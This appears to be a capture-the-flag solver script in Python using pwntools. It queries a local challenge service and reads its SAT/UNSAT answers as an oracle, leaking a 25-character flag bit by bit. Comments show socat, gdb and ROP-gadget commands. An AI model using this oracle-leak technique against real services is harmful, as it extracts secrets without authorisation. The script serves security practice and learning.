from pwn import *

#sudo gdb -q -p `pidof -s execfile` -x gdbcmd
#socat TCP-L:10001,reuseaddr,fork EXEC:./execfile

#./../../tools/rp-lin-x86 --file=mylibc --rop=3 --unique > mygads.txt


r = remote('localhost',50001)
print(r.recvuntil(b'> '))

L0 = bytes([ord('A')-0x10]) # 0th bytes of L

def ofFlag(i):
	return bytes([ord('A')-0x30+i])

flag = ""
for i in range(25):
	C = ofFlag(i)
	flagc = 0
	for j in range(7):
		query = None		
		if j == 0:
			query = (
				ofFlag(1) + b'*' +
				L0 + b'*' +
				C
			)
		elif j == 1:
			query = (
				ofFlag(1) + b'*' +
				L0 + b'*' +
				C + C
			)
		else:
			query = L0 + b'*' + (C * ((1<<j)-2))
		
		r.send(query + b'\n')
		s = r.recvuntil(b'> ')
		print(s)
		
		if b'UNSAT' in s:
			pass
		else:
			flagc |= (1 << j)
	
	flag += chr(flagc)

print(flag)
	
